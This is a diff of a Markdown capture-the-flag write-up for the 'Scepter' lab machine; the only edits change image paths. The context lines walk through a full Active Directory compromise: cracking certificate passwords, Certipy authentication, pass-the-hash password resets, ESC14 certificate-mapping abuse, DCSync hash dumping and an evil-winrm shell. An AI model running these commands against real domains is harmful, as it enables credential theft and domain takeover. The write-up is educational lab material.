@@ -94,7 +94,7 @@ Testing out SMB and RPC for Null/Guest authentication both fail and LDAP has ano
 └─$ rpcclient dc01.scepter.htb -U ''%''
 ```
 
-![](../assets/img/2026-05-08-Scepter/1.png)
+![](/assets/img/2026-05-08-Scepter/1.png)
 
 ### NFS Export
 Since there is an NFS server running, I check to see if any directories have been exported and are available to us which reveals one for `/helpdesk`. We can mount this to our file system and take a look around.
@@ -111,7 +111,7 @@ Since there is an NFS server running, I check to see if any directories have bee
 └─# ls /mnt/nfs_share
 ```
 
-![](../assets/img/2026-05-08-Scepter/2.png)
+![](/assets/img/2026-05-08-Scepter/2.png)
 
 ### Getting Domain Credentials
 Inside are a few certificate files for various users on the domain. These are required to be password-protected, however in my experience, most people don't bother to put anything complex. We can convert the PFX files into a crackable format with a tool like [pfx2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/pfx2john.py) and send it over to Hashcat or JohnTheRipper.
@@ -130,7 +130,7 @@ Inside are a few certificate files for various users on the domain. These are re
 └─$ john clarkhash --wordlist=/opt/seclists/rockyou.txt
 ```
 
-![](../assets/img/2026-05-08-Scepter/3.png)
+![](/assets/img/2026-05-08-Scepter/3.png)
 
 Looks like they all use the same weak password. We can now use [Certipy-AD](https://github.com/ly4k/Certipy) to authenticate to the Domain Controller and get an NTLM hash for any of the valid certs. Attempting to do so with the three PFX files and our recovered password all fail, returning an error saying that the client is not trusted.
 
@@ -142,7 +142,7 @@ Looks like they all use the same weak password. We can now use [Certipy-AD](http
 └─$ certipy-ad auth -pfx clark.pfx -password newpassword -dc-ip 10.129.244.44
 ```
 
-![](../assets/img/2026-05-08-Scepter/4.png)
+![](/assets/img/2026-05-08-Scepter/4.png)
 
 If you're unfamiliar with certificate authentication - In Active Directory environments that support PKINIT, a .pfx contains a user or machine certificate plus its private key, allowing the client to prove possession of that key instead of sending a password during the initial Kerberos AS-REQ. The domain controller validates the certificate chain and maps the certificate to an AD identity (for example via UPN or SID), then issues a Ticket Granting Ticket if the certificate is trusted and authorized. From there, Kerberos works normally-the certificate is only used for the initial authentication step.
 
@@ -170,11 +170,11 @@ $ sudo rdate -n dc01.scepter.htb
 
 Now we can rerun the Certipy-AD auth command which works to grab the NTLM hash for D.Baker this time.
 
-![](../assets/img/2026-05-08-Scepter/5.png)
+![](/assets/img/2026-05-08-Scepter/5.png)
 
 Using this in a Pass-The-Hash attack now lets us authenticate to the domain, which reveals zero non-standard SMB shares and no access to get a shell over WinRM.
 
-![](../assets/img/2026-05-08-Scepter/6.png)
+![](/assets/img/2026-05-08-Scepter/6.png)
 
 ### Mapping AD via BloodHound
 With limited access to services and not much to go off of, I use start mapping the domain with BloodHound and use [Bloodhound-Python](https://github.com/dirkjanm/bloodhound.py) to gather the data since we don't have shell access to use SharpHound.
@@ -185,12 +185,12 @@ With limited access to services and not much to go off of, I use start mapping t
 └─$ sudo bloodhound
 ```
 
-![](../assets/img/2026-05-08-Scepter/7.png)
+![](/assets/img/2026-05-08-Scepter/7.png)
 
 ### Changing User Password
 Checking which outbound object controls our current user has reveals that we have _ForceChangePassword_ permissions over another user named A.Carter.
 
-![](../assets/img/2026-05-08-Scepter/8.png)
+![](/assets/img/2026-05-08-Scepter/8.png)
 
 I'll use the net module from [PTH-Toolkit](https://github.com/byt3bl33d3r/pth-toolkit) to change this from my Kali machine to something simple.
 
@@ -198,12 +198,12 @@ I'll use the net module from [PTH-Toolkit](https://github.com/byt3bl33d3r/pth-to
 └─$ pth-net rpc password 'A.Carter' 'Password123!' -U 'scepter.htb'/'d.baker'%'aad3b435b51404eeaad3b435b51404ee':'18b5fb0d99e7a475316213c15b6f22ce' -S 'dc01.scepter.htb'
 ```
 
-![](../assets/img/2026-05-08-Scepter/9.png)
+![](/assets/img/2026-05-08-Scepter/9.png)
 
 ### Unable to use ESC9
 Repeating the same BloodHound enumeration process for this new user shows that we are apart of the IT Support group, which has _GenericAll_ permissions of the Staff Access Certificate Organization Unit (OU).
 
-![](../assets/img/2026-05-08-Scepter/10.png)
+![](/assets/img/2026-05-08-Scepter/10.png)
 
 We already know that Active Directory Certificate Services is installed on the domain, so I use Certipy-AD once again to discover any vulnerable certificate templates. Nothing comes from using A.Carter's account, however reverting to D.Baker's hash shows that the StaffAccessCertificate template has no security extension and is vulnerable to ESC9.
 
@@ -316,11 +316,11 @@ BloodHound didn't reveal anything else too crazy and we still didn't have a shel
 └─$ nxc ldap dc01.scepter.htb -u 'a.carter' -p 'Password123!' --query "(sAMAccountName=h.brown)" ""
 ```
 
-![](../assets/img/2026-05-08-Scepter/11.png)
+![](/assets/img/2026-05-08-Scepter/11.png)
 
 This reveals an unfamiliar attribute for the H.Brown user that intrigued me because none of the others had it assigned. Googling about it shows that it's a type of security mapping used to associate certificates with users. It's also stated that the use of `X509:<RFC822>` is considered weak as it relies on user-related identifiers.
 
-![](../assets/img/2026-05-08-Scepter/12.png)
+![](/assets/img/2026-05-08-Scepter/12.png)
 
 Essentially, if we control another (potentially higher-privileged) account to have the mail attribute set to `h.brown@scepter.htb`, we can impersonate them. 
 
@@ -337,7 +337,7 @@ Since A.Carter has _GenericAll_ over the Staff Access Certificate OU and D.Baker
 └─$ certipy-ad req -u d.baker@scepter.htb -hashes ':18b5fb0d99e7a475316213c15b6f22ce' -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.129.244.44
 ```
 
-![](../assets/img/2026-05-08-Scepter/13.png)
+![](/assets/img/2026-05-08-Scepter/13.png)
 
 This gives us a PFX file for the D.Baker user except its email matches H.Brown's, so when we authenticate with it, the DC will think that we are that user. Certipy will take care of grabbing a TGT and resolving an NTLM hash which can be used to login via WinRM since this account is apart of the Remote Management group.
 
@@ -345,13 +345,13 @@ This gives us a PFX file for the D.Baker user except its email matches H.Brown's
 └─$ certipy-ad auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.129.244.44 -username h.brown
 ```
 
-![](../assets/img/2026-05-08-Scepter/14.png)
+![](/assets/img/2026-05-08-Scepter/14.png)
 
 ### Initial Foothold
 After grabbing the hash, authenticating with it prompts an account restriction error. This is because H.Brown is also in the Protected Users group which disables NTLM authentication, among other things.
 
 
-![](../assets/img/2026-05-08-Scepter/15.png)
+![](/assets/img/2026-05-08-Scepter/15.png)
 
 This isn't too terrible as we can generate a krb5.conf file to properly configure Kerberos on our machine and then use the .ccache file generated from our earlier Certipy command to grab a shell that way. 
 
@@ -365,18 +365,18 @@ This isn't too terrible as we can generate a krb5.conf file to properly configur
 └─$ evil-winrm -i dc01.scepter.htb -r scepter.htb
 ```
 
-![](../assets/img/2026-05-08-Scepter/16.png)
+![](/assets/img/2026-05-08-Scepter/16.png)
 
 At this point we can grab the user flag under their Desktop folder and begin looking at ways to escalate privileges to Administrator.
 
 ## Privilege Escalation
 BloodHound shows that they are the only member in both the Certificate Management Service (CMS) and Helpdesk Admins group.
 
-![](../assets/img/2026-05-08-Scepter/17.png)
+![](/assets/img/2026-05-08-Scepter/17.png)
 
 I figured that we could work our magic with AD CS again, but the lack of outbound object permissions and direct paths to other accounts had me at a loss here. Taking a look at other high-profile targets showed that the P.Adams user is a member of the Replication Operators group, meaning we could abuse the Directory Replication Service (DRS) to perform a DCSync attack and dump all hashes on the domain.
 
-![](../assets/img/2026-05-08-Scepter/18.png)
+![](/assets/img/2026-05-08-Scepter/18.png)
 
 ### Repeating ESC14
 Eventually, I used BloodyAD to enumerate what write permissions we held which revealed that we can actually change the _altSecurityIdentities_ attribute for the P.Adams user. This is presumably from our membership in the CMS group. 
@@ -397,7 +397,7 @@ The output doesn't show that one is set and is also the reason I couldn't see it
 └─$ bloodyAD --host DC01.scepter.htb -d scepter.htb -k set object p.adams altSecurityIdentities -v 'X509:<RFC822>p.adams@scepter.htb'
 ```
 
-![](../assets/img/2026-05-08-Scepter/19.png)
+![](/assets/img/2026-05-08-Scepter/19.png)
 
 From here on, it's the same attack as before. We can use A.Carter's privileges to update D.Baker's mail attribute in order to match the new _altSecurityIdentities_ set for P.Adams. Once that's set, we request a certificate as D.Baker whilst impersonating P.Adams which should give us a PFX file.
 
@@ -407,7 +407,7 @@ From here on, it's the same attack as before. We can use A.Carter's privileges t
 └─$ certipy-ad req -u d.baker@scepter.htb -hashes ':18b5fb0d99e7a475316213c15b6f22ce' -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.129.244.44
 ```
 
-![](../assets/img/2026-05-08-Scepter/20.png)
+![](/assets/img/2026-05-08-Scepter/20.png)
 
 Next, we'll authenticate with it to grab their NTLM hash.
 
@@ -415,12 +415,12 @@ Next, we'll authenticate with it to grab their NTLM hash.
 └─$ certipy-ad auth -pfx d.baker_442e63f4-aad0-4297-b1ec-bd68877aa2d9.pfx -domain scepter.htb -dc-ip 10.129.244.44 -username p.adams
 ```
 
-![](../assets/img/2026-05-08-Scepter/21.png)
+![](/assets/img/2026-05-08-Scepter/21.png)
 
 ### DCSync Attack
 Finally, we already know this user can perform a DCSync attack, so I use Impacket's [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) script to carry this out remotely.
 
-![](../assets/img/2026-05-08-Scepter/22.png)
+![](/assets/img/2026-05-08-Scepter/22.png)
 
 Using the Administrator's NTLM in a Pass-The-Hash attack allows us to grab a shell over WinRM or the service of our choosing and grab the last flag under their Desktop folder.
 
@@ -428,6 +428,6 @@ Using the Administrator's NTLM in a Pass-The-Hash attack allows us to grab a she
 └─$ evil-winrm -i dc01.scepter.htb -u administrator -H '[REDACTED]'
 ```
 
-![](../assets/img/2026-05-08-Scepter/23.png)
+![](/assets/img/2026-05-08-Scepter/23.png)
 
 That's all y'all, this box was super neat due to the primary focus on Active Directory Certificate Services; I learned a lot about mappings and how the service works in general. I hope this was helpful to anyone following along or stuck and happy hacking!
